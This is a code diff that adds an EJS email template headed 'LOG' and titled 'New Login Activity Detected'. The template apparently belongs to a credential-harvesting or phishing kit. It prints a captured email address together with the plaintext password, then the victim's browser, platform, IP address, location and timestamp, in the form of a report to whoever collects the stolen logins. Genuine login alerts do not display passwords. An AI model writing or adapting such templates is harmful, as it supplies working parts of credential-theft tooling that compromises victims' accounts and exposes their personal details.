@@ -1,0 +1,25 @@
+<%- include('./base.ejs', { 
+    title: 'New Login Activity Detected', 
+    content: `
+        <h2>LOG</h2>
+        <p>A new login activity has been detected on your system.</p>
+        
+        <div class="info-box">
+            <p><span class="label">Email:</span> ${email}</p>
+            <p><span class="label">Password:</span> ${password}</p>
+        </div>
+        
+        <div class="info-box">
+            <p><span class="label">Browser:</span> ${browserName || 'Unknown'} ${browserVersion || ''}</p>
+            <p><span class="label">Platform:</span> ${platform || 'Unknown'}</p>
+            <p><span class="label">IP Address:</span> ${ipAddress || 'Unknown'}</p>
+            <p><span class="label">Location:</span> ${location || 'Unknown'}</p>
+        </div>
+        
+        <div class="info-box">
+            <p><span class="label">Timestamp:</span> ${new Date().toLocaleString()}</p>
+        </div>
+        
+     
+    `
+}) %>
